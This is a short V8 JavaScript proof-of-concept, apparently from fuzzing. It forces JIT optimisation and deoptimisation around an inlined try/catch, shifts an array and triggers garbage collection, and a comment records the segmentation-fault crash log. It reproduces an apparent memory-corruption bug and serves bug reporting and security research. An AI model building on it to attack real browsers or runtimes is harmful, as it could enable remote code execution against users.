// --allow-natives-syntax --expose-gc 
function vul() {
    const arr = Array(1000);
    function inlined_func() {
        try {
            const err_obj = {e:p4nda,length:arr};
        } catch(e) {
            return e 
        }
    }
    for(var i = 0;i<25;i++){
        inlined_func(); 
    }
    var res = inlined_func();
    /p4nda/.test({}); // deopt here
    arr.shift();  // modify element in -*runtime*-
    return res;
}

//print("------------------- run as builtin------------------");
%PrepareFunctionForOptimization(vul);
vul();
vul();
%OptimizeFunctionOnNextCall(vul);      
//print("------------------- run as jit------------------");

var res = vul();

gc();
gc();

/*
Received signal 11 SEGV_ACCERR 2ca1beadbef6

==== C stack trace ===============================

 [0x7fc424e84547]
 [0x7fc424a713c0]
 [0x7fc425fc2453]
 [0x7fc425fc7031]
 [0x7fc425fc67e1]
 [0x7fc425f8c5a9]
 [0x7fc425f897bb]
 [0x7fc425f86bda]
 [0x7fc425f88793]
 [0x7fc425cdfb79]
 [0x7fc425cde406]
 [0x7fc425cdc808]
 [0x7fc425cdc2f8]
 [0x7fc4257048bf]
[end of stack trace]
[1]    80387 segmentation fault (core dumped)  ~/fuzz/v8/out.gn/x64.debug/d8 --allow-natives-syntax --expose-gc test.js
*/